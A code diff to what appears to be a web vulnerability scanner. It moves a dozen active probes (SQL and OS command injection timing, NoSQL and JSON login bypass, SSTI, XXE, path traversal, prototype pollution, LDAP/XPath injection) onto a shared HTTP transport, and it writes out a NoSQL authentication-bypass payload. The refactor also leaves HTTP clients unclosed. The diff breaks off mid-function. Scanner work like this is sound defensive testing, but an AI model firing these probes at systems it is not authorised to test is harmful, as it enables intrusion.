@@ -36,6 +36,7 @@ from .shared import (
     _looks_like_sane_url,
     _shannon_entropy,
     _replace_query_param,
+    get_transport,
 )
 
 _SQLI_DELAY_SECONDS = 6
@@ -71,47 +72,47 @@ async def check_blind_sqli_timing(url: str) -> dict | None:
     param_names = list(query_params.keys())[:_MAX_PARAMS_PER_URL]
 
     try:
-        async with httpx.AsyncClient(timeout=httpx.Timeout(20.0, connect=5.0), verify=False) as client:
-            t0_start = time.monotonic()
-            await client.get(url)
-            baseline = time.monotonic() - t0_start
+        client = httpx.AsyncClient(timeout=httpx.Timeout(20.0, connect=5.0), transport=get_transport())
+        t0_start = time.monotonic()
+        await client.get(url)
+        baseline = time.monotonic() - t0_start
 
-            for param in param_names:
-                for payload_template in _SQLI_TIMING_PAYLOADS:
-                    payload = payload_template.format(delay=_SQLI_DELAY_SECONDS)
-                    mutated = _replace_query_param(parsed, query_params, param, payload)
+        for param in param_names:
+            for payload_template in _SQLI_TIMING_PAYLOADS:
+                payload = payload_template.format(delay=_SQLI_DELAY_SECONDS)
+                mutated = _replace_query_param(parsed, query_params, param, payload)
 
-                    t1_start = time.monotonic()
-                    try:
-                        await client.get(mutated)
-                    except httpx.TimeoutException:
-                        pass  # a timeout on the delayed request is itself a data point
-                    elapsed_delayed = time.monotonic() - t1_start
+                t1_start = time.monotonic()
+                try:
+                    await client.get(mutated)
+                except httpx.TimeoutException:
+                    pass  # a timeout on the delayed request is itself a data point
+                elapsed_delayed = time.monotonic() - t1_start
 
-                    if elapsed_delayed < baseline + (_SQLI_DELAY_SECONDS - 1.0):
-                        continue  # not slow enough to be the injected delay - try next payload
+                if elapsed_delayed < baseline + (_SQLI_DELAY_SECONDS - 1.0):
+                    continue  # not slow enough to be the injected delay - try next payload
 
-                    # Confirm with a same-parameter, zero-delay control -
-                    # if this also comes back slow, it's network jitter,
-                    # not the database honoring our SLEEP().
-                    control_url = _replace_query_param(
-                        parsed, query_params, param, _SQLI_CONTROL_PAYLOAD
-                    )
-                    t2_start = time.monotonic()
-                    await client.get(control_url)
-                    elapsed_control = time.monotonic() - t2_start
+                # Confirm with a same-parameter, zero-delay control -
+                # if this also comes back slow, it's network jitter,
+                # not the database honoring our SLEEP().
+                control_url = _replace_query_param(
+                    parsed, query_params, param, _SQLI_CONTROL_PAYLOAD
+                )
+                t2_start = time.monotonic()
+                await client.get(control_url)
+                elapsed_control = time.monotonic() - t2_start
 
-                    if elapsed_control < baseline + 2.0:
-                        return {
-                            "vuln_type": "blind_sql_injection",
-                            "severity": "critical",
-                            "evidence": (
-                                f"{url} param '{param}': baseline={baseline:.1f}s, "
-                                f"SLEEP({_SQLI_DELAY_SECONDS}) payload={elapsed_delayed:.1f}s, "
-                                f"zero-delay control={elapsed_control:.1f}s. Timing consistently "
-                                f"follows the injected delay - confirmed blind SQL injection."
-                            ),
-                        }
+                if elapsed_control < baseline + 2.0:
+                    return {
+                        "vuln_type": "blind_sql_injection",
+                        "severity": "critical",
+                        "evidence": (
+                            f"{url} param '{param}': baseline={baseline:.1f}s, "
+                            f"SLEEP({_SQLI_DELAY_SECONDS}) payload={elapsed_delayed:.1f}s, "
+                            f"zero-delay control={elapsed_control:.1f}s. Timing consistently "
+                            f"follows the injected delay - confirmed blind SQL injection."
+                        ),
+                    }
     except httpx.HTTPError as exc:
         logger.info("detective: blind SQLi timing check failed for %s: %s", url, exc)
     return None
@@ -214,27 +215,27 @@ async def check_crlf_injection(url: str) -> dict | None:
     param_names = list(query_params.keys())[:2]
     logger.info("detective: checking CRLF injection for %s", url)
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, verify=False) as client:
+        client = httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, transport=get_transport())
+        try:
+            baseline_resp = await client.get(url)
+            baseline_header_names = {k.lower() for k in baseline_resp.headers.keys()}
+        except httpx.HTTPError:
+            # No baseline available - fall back to "no pre-existing headers",
+            # which is stricter (more headers count as "new") rather than
+            # silently skipping the check.
+            baseline_header_names = set()
+
+        for param in param_names:
+            mutated = _inject_raw_query_param(url, param, _CRLF_PAYLOAD)
             try:
-                baseline_resp = await client.get(url)
-                baseline_header_names = {k.lower() for k in baseline_resp.headers.keys()}
+                resp = await client.get(mutated)
             except httpx.HTTPError:
-                # No baseline available - fall back to "no pre-existing headers",
-                # which is stricter (more headers count as "new") rather than
-                # silently skipping the check.
-                baseline_header_names = set()
+                continue
 
-            for param in param_names:
-                mutated = _inject_raw_query_param(url, param, _CRLF_PAYLOAD)
-                try:
-                    resp = await client.get(mutated)
-                except httpx.HTTPError:
-                    continue
-
-                finding = _evaluate_crlf_response(resp, baseline_header_names)
-                if finding:
-                    finding["evidence"] = f"{url} param '{param}': " + finding["evidence"]
-                    return finding
+            finding = _evaluate_crlf_response(resp, baseline_header_names)
+            if finding:
+                finding["evidence"] = f"{url} param '{param}': " + finding["evidence"]
+                return finding
     except httpx.HTTPError as exc:
         logger.info("detective: CRLF injection check failed for %s: %s", url, exc)
     return None
@@ -293,27 +294,27 @@ async def check_blind_nosql_injection(host: str) -> dict | None:
     """
     base = host.rstrip("/")
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, verify=False) as client:
-            for path in _LOGIN_CANDIDATE_PATHS:
-                url = base + path
-                for user_field, pass_field in _LOGIN_FIELD_COMBOS:
-                    logger.info("detective: checking blind NoSQL injection for %s", url)
-                    payload_body = {user_field: {"$ne": None}, pass_field: {"$ne": None}}
-                    result = await _check_login_bypass(client, url, user_field, pass_field, payload_body)
-                    if result is None:
-                        continue
-                    if result["bypassed"]:
-                        return {
-                            "vuln_type": "blind_nosql_injection",
-                            "severity": "critical",
-                            "evidence": (
-                                f"{url}: garbage credentials returned HTTP {result['baseline_status']} "
-                                f"with no session cookie, but the NoSQL operator payload "
-                                f"{{'{user_field}': {{'$ne': null}}, '{pass_field}': {{'$ne': null}}}} "
-                                f"returned HTTP {result['payload_status']} WITH a session cookie set - "
-                                f"authentication bypass via NoSQL operator injection."
-                            ),
-                        }
+        client = httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, transport=get_transport())
+        for path in _LOGIN_CANDIDATE_PATHS:
+            url = base + path
+            for user_field, pass_field in _LOGIN_FIELD_COMBOS:
+                logger.info("detective: checking blind NoSQL injection for %s", url)
+                payload_body = {user_field: {"$ne": None}, pass_field: {"$ne": None}}
+                result = await _check_login_bypass(client, url, user_field, pass_field, payload_body)
+                if result is None:
+                    continue
+                if result["bypassed"]:
+                    return {
+                        "vuln_type": "blind_nosql_injection",
+                        "severity": "critical",
+                        "evidence": (
+                            f"{url}: garbage credentials returned HTTP {result['baseline_status']} "
+                            f"with no session cookie, but the NoSQL operator payload "
+                            f"{{'{user_field}': {{'$ne': null}}, '{pass_field}': {{'$ne': null}}}} "
+                            f"returned HTTP {result['payload_status']} WITH a session cookie set - "
+                            f"authentication bypass via NoSQL operator injection."
+                        ),
+                    }
     except httpx.HTTPError as exc:
         logger.info("detective: blind NoSQL injection check failed for %s: %s", host, exc)
     return None
@@ -338,30 +339,30 @@ async def check_json_type_confusion(host: str) -> dict | None:
     """
     base = host.rstrip("/")
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, verify=False) as client:
-            for path in _LOGIN_CANDIDATE_PATHS:
-                url = base + path
-                for user_field, pass_field in _LOGIN_FIELD_COMBOS:
-                    for variant_name, variant_value in _TYPE_CONFUSION_VARIANTS:
-                        logger.info(
-                            "detective: checking JSON type confusion (%s) for %s", variant_name, url
-                        )
-                        payload_body = {user_field: variant_value, pass_field: variant_value}
-                        result = await _check_login_bypass(client, url, user_field, pass_field, payload_body)
-                        if result is None:
-                            continue
-                        if result["bypassed"]:
-                            return {
-                                "vuln_type": "json_type_confusion",
-                                "severity": "critical",
-                                "evidence": (
-                                    f"{url}: garbage credentials returned HTTP {result['baseline_status']} "
-                                    f"with no session cookie, but substituting field types "
-                                    f"('{variant_name}': {user_field}={variant_value!r}) returned HTTP "
-                                    f"{result['payload_status']} WITH a session cookie set - the backend "
-                                    f"appears to mishandle an unexpected JSON type on the auth check."
-                                ),
-                            }
+        client = httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, transport=get_transport())
+        for path in _LOGIN_CANDIDATE_PATHS:
+            url = base + path
+            for user_field, pass_field in _LOGIN_FIELD_COMBOS:
+                for variant_name, variant_value in _TYPE_CONFUSION_VARIANTS:
+                    logger.info(
+                        "detective: checking JSON type confusion (%s) for %s", variant_name, url
+                    )
+                    payload_body = {user_field: variant_value, pass_field: variant_value}
+                    result = await _check_login_bypass(client, url, user_field, pass_field, payload_body)
+                    if result is None:
+                        continue
+                    if result["bypassed"]:
+                        return {
+                            "vuln_type": "json_type_confusion",
+                            "severity": "critical",
+                            "evidence": (
+                                f"{url}: garbage credentials returned HTTP {result['baseline_status']} "
+                                f"with no session cookie, but substituting field types "
+                                f"('{variant_name}': {user_field}={variant_value!r}) returned HTTP "
+                                f"{result['payload_status']} WITH a session cookie set - the backend "
+                                f"appears to mishandle an unexpected JSON type on the auth check."
+                            ),
+                        }
     except httpx.HTTPError as exc:
         logger.info("detective: JSON type confusion check failed for %s: %s", host, exc)
     return None
@@ -393,9 +394,9 @@ async def check_http_param_pollution(url: str) -> str | None:
 
     logger.info("detective: checking HTTP parameter pollution for %s", url)
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True, verify=False) as client:
-            baseline = await client.get(url)
-            polluted = await client.get(polluted_url)
+        client = httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True, transport=get_transport())
+        baseline = await client.get(url)
+        polluted = await client.get(polluted_url)
     except httpx.HTTPError:
         return None
 
@@ -428,11 +429,11 @@ async def check_host_header_injection(url: str) -> dict | None:
     marker = "swas-hhi-probe.invalid"
     parsed = httpx.URL(url)
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
-            resp = await client.get(
-                url,
-                headers={"Host": marker, "X-Forwarded-Host": marker},
-            )
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=False)
+        resp = await client.get(
+            url,
+            headers={"Host": marker, "X-Forwarded-Host": marker},
+        )
     except httpx.HTTPError as exc:
         logger.info("detective: host header injection check failed for %s: %s", url, exc)
         return None
@@ -511,39 +512,39 @@ async def check_ssti(url: str) -> dict | None:
     existing_params = dict(parsed.params)
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            try:
-                baseline_resp = await client.get(url)
-                baseline_body = baseline_resp.text
-            except httpx.HTTPError:
-                return None
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            baseline_resp = await client.get(url)
+            baseline_body = baseline_resp.text
+        except httpx.HTTPError:
+            return None
 
-            for param_name in existing_params:
-                for payload, expected in _ssti_probes():
-                    if expected in baseline_body:
-                        continue  # would coincidentally match even unmodified - skip this operand pair
-                    test_params = dict(existing_params)
-                    test_params[param_name] = existing_params[param_name] + payload
-                    test_url = parsed.copy_with(params=test_params)
-                    try:
-                        resp = await client.get(test_url)
-                    except httpx.HTTPError:
-                        continue
-                    body = resp.text
-                    if payload in body:
-                        continue  # reflected raw, not evaluated - not a finding
-                    if expected in body:
-                        return {
-                            "vuln_type": "server_side_template_injection",
-                            "severity": "critical",
-                            "evidence": (
-                                f"{test_url}: parameter '{param_name}' with payload {payload!r} "
-                                f"caused the literal evaluated result {expected!r} to appear in the "
-                                f"response body (payload itself not present unevaluated, and "
-                                f"{expected!r} was absent from an unmodified baseline request to "
-                                f"the same URL), consistent with server-side template injection / RCE."
-                            ),
-                        }
+        for param_name in existing_params:
+            for payload, expected in _ssti_probes():
+                if expected in baseline_body:
+                    continue  # would coincidentally match even unmodified - skip this operand pair
+                test_params = dict(existing_params)
+                test_params[param_name] = existing_params[param_name] + payload
+                test_url = parsed.copy_with(params=test_params)
+                try:
+                    resp = await client.get(test_url)
+                except httpx.HTTPError:
+                    continue
+                body = resp.text
+                if payload in body:
+                    continue  # reflected raw, not evaluated - not a finding
+                if expected in body:
+                    return {
+                        "vuln_type": "server_side_template_injection",
+                        "severity": "critical",
+                        "evidence": (
+                            f"{test_url}: parameter '{param_name}' with payload {payload!r} "
+                            f"caused the literal evaluated result {expected!r} to appear in the "
+                            f"response body (payload itself not present unevaluated, and "
+                            f"{expected!r} was absent from an unmodified baseline request to "
+                            f"the same URL), consistent with server-side template injection / RCE."
+                        ),
+                    }
     except httpx.HTTPError as exc:
         logger.info("detective: SSTI check failed for %s: %s", url, exc)
     return None
@@ -563,40 +564,40 @@ async def check_prototype_pollution(url: str) -> dict | None:
     payload = {"__proto__": {marker_key: marker_val}}
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            try:
-                post_resp = await client.post(url, json=payload)
-            except httpx.HTTPError:
-                return None
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            post_resp = await client.post(url, json=payload)
+        except httpx.HTTPError:
+            return None
 
-            if marker_val in post_resp.text:
-                return {
-                    "vuln_type": "prototype_pollution",
-                    "severity": "high",
-                    "evidence": (
-                        f"{url}: POSTing a __proto__ gadget ({payload}) caused the injected "
-                        f"marker value {marker_val!r} to be reflected directly in the response."
-                    ),
-                }
+        if marker_val in post_resp.text:
+            return {
+                "vuln_type": "prototype_pollution",
+                "severity": "high",
+                "evidence": (
+                    f"{url}: POSTing a __proto__ gadget ({payload}) caused the injected "
+                    f"marker value {marker_val!r} to be reflected directly in the response."
+                ),
+            }
 
-            # Second signal: a plain, unrelated GET on the same origin picking up
-            # the polluted property would indicate the pollution reached shared/
-            # global object state, not just this one request's local object.
-            try:
-                probe_resp = await client.get(url)
-            except httpx.HTTPError:
-                return None
-            if marker_val in probe_resp.text:
-                return {
-                    "vuln_type": "prototype_pollution",
-                    "severity": "critical",
-                    "evidence": (
-                        f"{url}: after POSTing a __proto__ gadget, a separate follow-up GET to "
-                        f"the same URL also returned the injected marker {marker_val!r}, "
-                        f"indicating the pollution affected shared/global state rather than "
-                        f"just the one request - broader blast radius."
-                    ),
-                }
+        # Second signal: a plain, unrelated GET on the same origin picking up
+        # the polluted property would indicate the pollution reached shared/
+        # global object state, not just this one request's local object.
+        try:
+            probe_resp = await client.get(url)
+        except httpx.HTTPError:
+            return None
+        if marker_val in probe_resp.text:
+            return {
+                "vuln_type": "prototype_pollution",
+                "severity": "critical",
+                "evidence": (
+                    f"{url}: after POSTing a __proto__ gadget, a separate follow-up GET to "
+                    f"the same URL also returned the injected marker {marker_val!r}, "
+                    f"indicating the pollution affected shared/global state rather than "
+                    f"just the one request - broader blast radius."
+                ),
+            }
     except httpx.HTTPError as exc:
         logger.info("detective: prototype pollution check failed for %s: %s", url, exc)
     return None
@@ -631,35 +632,35 @@ async def check_sqli_error_based(url: str) -> dict | None:
     existing_params = dict(parsed.params)
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            # Baseline first - some apps always show a DB-flavored error page
-            # regardless of input, which would otherwise false-positive every param.
-            try:
-                baseline = await client.get(url)
-            except httpx.HTTPError:
-                return None
-            baseline_body = baseline.text
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        # Baseline first - some apps always show a DB-flavored error page
+        # regardless of input, which would otherwise false-positive every param.
+        try:
+            baseline = await client.get(url)
+        except httpx.HTTPError:
+            return None
+        baseline_body = baseline.text
 
-            for param_name in existing_params:
-                for probe in _SQLI_ERROR_PROBES:
-                    test_params = dict(existing_params)
-                    test_params[param_name] = existing_params[param_name] + probe
-                    test_url = parsed.copy_with(params=test_params)
-                    try:
-                        resp = await client.get(test_url)
-                    except httpx.HTTPError:
-                        continue
-                    for pattern, db_type in _SQLI_ERROR_SIGNATURES:
-                        if pattern.search(resp.text) and not pattern.search(baseline_body):
-                            return {
-                                "vuln_type": "sql_injection_error_based",
-                                "severity": "critical",
-                                "evidence": (
-                                    f"{test_url}: parameter '{param_name}' with probe {probe!r} "
-                                    f"triggered a {db_type} error signature not present in the "
-                                    f"baseline (unmodified) response."
-                                ),
-                            }
+        for param_name in existing_params:
+            for probe in _SQLI_ERROR_PROBES:
+                test_params = dict(existing_params)
+                test_params[param_name] = existing_params[param_name] + probe
+                test_url = parsed.copy_with(params=test_params)
+                try:
+                    resp = await client.get(test_url)
+                except httpx.HTTPError:
+                    continue
+                for pattern, db_type in _SQLI_ERROR_SIGNATURES:
+                    if pattern.search(resp.text) and not pattern.search(baseline_body):
+                        return {
+                            "vuln_type": "sql_injection_error_based",
+                            "severity": "critical",
+                            "evidence": (
+                                f"{test_url}: parameter '{param_name}' with probe {probe!r} "
+                                f"triggered a {db_type} error signature not present in the "
+                                f"baseline (unmodified) response."
+                            ),
+                        }
     except httpx.HTTPError as exc:
         logger.info("detective: error-based SQLi check failed for %s: %s", url, exc)
     return None
@@ -694,37 +695,37 @@ async def check_xxe_error_based(url: str) -> dict | None:
     to do with XML at all. Same false-positive lesson as check_ssti.
     """
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            try:
-                baseline_resp = await client.get(url)
-                baseline_lower = baseline_resp.text.lower()
-            except httpx.HTTPError:
-                baseline_lower = ""
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            baseline_resp = await client.get(url)
+            baseline_lower = baseline_resp.text.lower()
+        except httpx.HTTPError:
+            baseline_lower = ""
 
-            try:
-                resp = await client.post(
-                    url,
-                    content=_XXE_PAYLOAD,
-                    headers={"Content-Type": "application/xml"},
-                )
-            except httpx.HTTPError:
-                return None
+        try:
+            resp = await client.post(
+                url,
+                content=_XXE_PAYLOAD,
+                headers={"Content-Type": "application/xml"},
+            )
+        except httpx.HTTPError:
+            return None
 
-            body_lower = resp.text.lower()
-            for sig in _XXE_ERROR_SIGNATURES:
-                sig_lower = sig.lower()
-                if sig_lower in body_lower and sig_lower not in baseline_lower:
-                    return {
-                        "vuln_type": "xxe_external_entity_processing",
-                        "severity": "high",
-                        "evidence": (
-                            f"{url}: sending an XML body with an external entity referencing a "
-                            f"nonexistent local path triggered a parser error signature "
-                            f"({sig!r}, absent from a baseline GET on the same URL), indicating "
-                            f"the XML parser attempted to resolve external entities rather than "
-                            f"rejecting the DOCTYPE outright."
-                        ),
-                    }
+        body_lower = resp.text.lower()
+        for sig in _XXE_ERROR_SIGNATURES:
+            sig_lower = sig.lower()
+            if sig_lower in body_lower and sig_lower not in baseline_lower:
+                return {
+                    "vuln_type": "xxe_external_entity_processing",
+                    "severity": "high",
+                    "evidence": (
+                        f"{url}: sending an XML body with an external entity referencing a "
+                        f"nonexistent local path triggered a parser error signature "
+                        f"({sig!r}, absent from a baseline GET on the same URL), indicating "
+                        f"the XML parser attempted to resolve external entities rather than "
+                        f"rejecting the DOCTYPE outright."
+                    ),
+                }
     except httpx.HTTPError as exc:
         logger.info("detective: XXE check failed for %s: %s", url, exc)
     return None
@@ -756,8 +757,8 @@ async def check_insecure_deserialization_signature(url: str) -> str | None:
     candidates: list[str] = list(parsed.params.values())
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            resp = await client.get(url)
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        resp = await client.get(url)
     except httpx.HTTPError as exc:
         logger.info("detective: deserialization signature check failed for %s: %s", url, exc)
         return None
@@ -814,34 +815,34 @@ async def check_path_traversal_lfi(url: str) -> dict | None:
     existing_params = dict(parsed.params)
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            try:
-                baseline_resp = await client.get(url)
-                baseline_body = baseline_resp.text
-            except httpx.HTTPError:
-                return None
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            baseline_resp = await client.get(url)
+            baseline_body = baseline_resp.text
+        except httpx.HTTPError:
+            return None
 
-            for param_name in existing_params:
-                for probe in _PATH_TRAVERSAL_PROBES:
-                    test_params = dict(existing_params)
-                    test_params[param_name] = probe
-                    test_url = parsed.copy_with(params=test_params)
-                    try:
-                        resp = await client.get(test_url)
-                    except httpx.HTTPError:
-                        continue
-                    for sig in _PATH_TRAVERSAL_SIGNATURES:
-                        if sig in resp.text and sig not in baseline_body:
-                            return {
-                                "vuln_type": "path_traversal_lfi",
-                                "severity": "critical",
-                                "evidence": (
-                                    f"{test_url}: parameter '{param_name}' with traversal probe "
-                                    f"{probe!r} returned a response containing {sig!r} (absent "
-                                    f"from the unmodified baseline response) - confirmed local "
-                                    f"file read."
-                                ),
-                            }
+        for param_name in existing_params:
+            for probe in _PATH_TRAVERSAL_PROBES:
+                test_params = dict(existing_params)
+                test_params[param_name] = probe
+                test_url = parsed.copy_with(params=test_params)
+                try:
+                    resp = await client.get(test_url)
+                except httpx.HTTPError:
+                    continue
+                for sig in _PATH_TRAVERSAL_SIGNATURES:
+                    if sig in resp.text and sig not in baseline_body:
+                        return {
+                            "vuln_type": "path_traversal_lfi",
+                            "severity": "critical",
+                            "evidence": (
+                                f"{test_url}: parameter '{param_name}' with traversal probe "
+                                f"{probe!r} returned a response containing {sig!r} (absent "
+                                f"from the unmodified baseline response) - confirmed local "
+                                f"file read."
+                            ),
+                        }
     except httpx.HTTPError as exc:
         logger.info("detective: path traversal check failed for %s: %s", url, exc)
     return None
@@ -875,45 +876,45 @@ async def check_os_command_injection(url: str) -> dict | None:
     param_names = list(query_params.keys())[:_MAX_PARAMS_PER_URL]
 
     try:
-        async with httpx.AsyncClient(timeout=httpx.Timeout(20.0, connect=5.0), verify=False) as client:
-            t0_start = time.monotonic()
-            await client.get(url)
-            baseline = time.monotonic() - t0_start
+        client = httpx.AsyncClient(timeout=httpx.Timeout(20.0, connect=5.0), transport=get_transport())
+        t0_start = time.monotonic()
+        await client.get(url)
+        baseline = time.monotonic() - t0_start
 
-            for param in param_names:
-                for payload_template in _CMDI_PAYLOAD_TEMPLATES:
-                    payload = payload_template.format(delay=_CMDI_DELAY_SECONDS)
-                    mutated = _replace_query_param(parsed, query_params, param, payload)
+        for param in param_names:
+            for payload_template in _CMDI_PAYLOAD_TEMPLATES:
+                payload = payload_template.format(delay=_CMDI_DELAY_SECONDS)
+                mutated = _replace_query_param(parsed, query_params, param, payload)
 
-                    t1_start = time.monotonic()
-                    try:
-                        await client.get(mutated)
-                    except httpx.TimeoutException:
-                        pass
-                    elapsed_delayed = time.monotonic() - t1_start
+                t1_start = time.monotonic()
+                try:
+                    await client.get(mutated)
+                except httpx.TimeoutException:
+                    pass
+                elapsed_delayed = time.monotonic() - t1_start
 
-                    if elapsed_delayed < baseline + (_CMDI_DELAY_SECONDS - 1.0):
-                        continue
+                if elapsed_delayed < baseline + (_CMDI_DELAY_SECONDS - 1.0):
+                    continue
 
-                    control_url = _replace_query_param(
-                        parsed, query_params, param, _CMDI_CONTROL_TEMPLATE
-                    )
-                    t2_start = time.monotonic()
-                    await client.get(control_url)
-                    elapsed_control = time.monotonic() - t2_start
+                control_url = _replace_query_param(
+                    parsed, query_params, param, _CMDI_CONTROL_TEMPLATE
+                )
+                t2_start = time.monotonic()
+                await client.get(control_url)
+                elapsed_control = time.monotonic() - t2_start
 
-                    if elapsed_control < baseline + 2.0:
-                        return {
-                            "vuln_type": "os_command_injection",
-                            "severity": "critical",
-                            "evidence": (
-                                f"{url} param '{param}': baseline={baseline:.1f}s, "
-                                f"payload {payload_template!r} with sleep({_CMDI_DELAY_SECONDS})="
-                                f"{elapsed_delayed:.1f}s, zero-delay control={elapsed_control:.1f}s. "
-                                f"Timing consistently follows the injected delay - confirmed OS "
-                                f"command injection."
-                            ),
-                        }
+                if elapsed_control < baseline + 2.0:
+                    return {
+                        "vuln_type": "os_command_injection",
+                        "severity": "critical",
+                        "evidence": (
+                            f"{url} param '{param}': baseline={baseline:.1f}s, "
+                            f"payload {payload_template!r} with sleep({_CMDI_DELAY_SECONDS})="
+                            f"{elapsed_delayed:.1f}s, zero-delay control={elapsed_control:.1f}s. "
+                            f"Timing consistently follows the injected delay - confirmed OS "
+                            f"command injection."
+                        ),
+                    }
     except httpx.HTTPError as exc:
         logger.info("detective: OS command injection check failed for %s: %s", url, exc)
     return None
@@ -942,42 +943,42 @@ async def check_lfi_via_php_wrapper(url: str) -> dict | None:
     existing_params = dict(parsed.params)
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            try:
-                baseline_resp = await client.get(url)
-                baseline_body = baseline_resp.text
-            except httpx.HTTPError:
-                return None
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            baseline_resp = await client.get(url)
+            baseline_body = baseline_resp.text
+        except httpx.HTTPError:
+            return None
 
-            for param_name in existing_params:
-                for probe in _PHP_WRAPPER_PROBES:
-                    test_params = dict(existing_params)
-                    test_params[param_name] = probe
-                    test_url = parsed.copy_with(params=test_params)
+        for param_name in existing_params:
+            for probe in _PHP_WRAPPER_PROBES:
+                test_params = dict(existing_params)
+                test_params[param_name] = probe
+                test_url = parsed.copy_with(params=test_params)
+                try:
+                    resp = await client.get(test_url)
+                except httpx.HTTPError:
+                    continue
+                if resp.text == baseline_body:
+                    continue
+                candidate = resp.text.strip()
+                for token in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", candidate):
                     try:
-                        resp = await client.get(test_url)
-                    except httpx.HTTPError:
+                        decoded = base64.b64decode(token + "=" * (-len(token) % 4)).decode("utf-8", errors="ignore")
+                    except Exception:
                         continue
-                    if resp.text == baseline_body:
-                        continue
-                    candidate = resp.text.strip()
-                    for token in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", candidate):
-                        try:
-                            decoded = base64.b64decode(token + "=" * (-len(token) % 4)).decode("utf-8", errors="ignore")
-                        except Exception:
-                            continue
-                        if any(marker in decoded for marker in _PHP_SOURCE_MARKERS):
-                            return {
-                                "vuln_type": "lfi_php_wrapper_source_disclosure",
-                                "severity": "critical",
-                                "evidence": (
-                                    f"{test_url}: parameter '{param_name}' with php://filter "
-                                    f"wrapper probe {probe!r} returned a base64 blob that "
-                                    f"decodes to PHP source (contains {'/'.join(_PHP_SOURCE_MARKERS)}) "
-                                    f"- confirmed local file read via wrapper bypass, not just "
-                                    f"file existence."
-                                ),
-                            }
+                    if any(marker in decoded for marker in _PHP_SOURCE_MARKERS):
+                        return {
+                            "vuln_type": "lfi_php_wrapper_source_disclosure",
+                            "severity": "critical",
+                            "evidence": (
+                                f"{test_url}: parameter '{param_name}' with php://filter "
+                                f"wrapper probe {probe!r} returned a base64 blob that "
+                                f"decodes to PHP source (contains {'/'.join(_PHP_SOURCE_MARKERS)}) "
+                                f"- confirmed local file read via wrapper bypass, not just "
+                                f"file existence."
+                            ),
+                        }
     except httpx.HTTPError as exc:
         logger.info("detective: PHP wrapper LFI check failed for %s: %s", url, exc)
     return None
@@ -1004,33 +1005,33 @@ async def check_ldap_injection_error_based(url: str) -> dict | None:
     existing_params = dict(parsed.params)
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            try:
-                baseline_resp = await client.get(url)
-                baseline_body = baseline_resp.text
-            except httpx.HTTPError:
-                return None
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            baseline_resp = await client.get(url)
+            baseline_body = baseline_resp.text
+        except httpx.HTTPError:
+            return None
 
-            for param_name in existing_params:
-                for probe in _LDAP_INJECTION_PROBES:
-                    test_params = dict(existing_params)
-                    test_params[param_name] = probe
-                    test_url = parsed.copy_with(params=test_params)
-                    try:
-                        resp = await client.get(test_url)
-                    except httpx.HTTPError:
-                        continue
-                    for sig in _LDAP_ERROR_SIGNATURES:
-                        if sig in resp.text and sig not in baseline_body:
-                            return {
-                                "vuln_type": "ldap_injection_error_based",
-                                "severity": "high",
-                                "evidence": (
-                                    f"{test_url}: parameter '{param_name}' with LDAP filter-"
-                                    f"breaking probe {probe!r} triggered an LDAP-specific error "
-                                    f"signature ({sig!r}, absent from baseline)."
-                                ),
-                            }
+        for param_name in existing_params:
+            for probe in _LDAP_INJECTION_PROBES:
+                test_params = dict(existing_params)
+                test_params[param_name] = probe
+                test_url = parsed.copy_with(params=test_params)
+                try:
+                    resp = await client.get(test_url)
+                except httpx.HTTPError:
+                    continue
+                for sig in _LDAP_ERROR_SIGNATURES:
+                    if sig in resp.text and sig not in baseline_body:
+                        return {
+                            "vuln_type": "ldap_injection_error_based",
+                            "severity": "high",
+                            "evidence": (
+                                f"{test_url}: parameter '{param_name}' with LDAP filter-"
+                                f"breaking probe {probe!r} triggered an LDAP-specific error "
+                                f"signature ({sig!r}, absent from baseline)."
+                            ),
+                        }
     except httpx.HTTPError as exc:
         logger.info("detective: LDAP injection check failed for %s: %s", url, exc)
     return None
@@ -1057,33 +1058,33 @@ async def check_xpath_injection_error_based(url: str) -> dict | None:
     existing_params = dict(parsed.params)
 
     try:
-        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
-            try:
-                baseline_resp = await client.get(url)
-                baseline_body = baseline_resp.text
-            except httpx.HTTPError:
-                return None
+        client = httpx.AsyncClient(timeout=_TIMEOUT, transport=get_transport(), follow_redirects=True)
+        try:
+            baseline_resp = await client.get(url)
+            baseline_body = baseline_resp.text
+        except httpx.HTTPError:
+            return None
 
-            for param_name in existing_params:
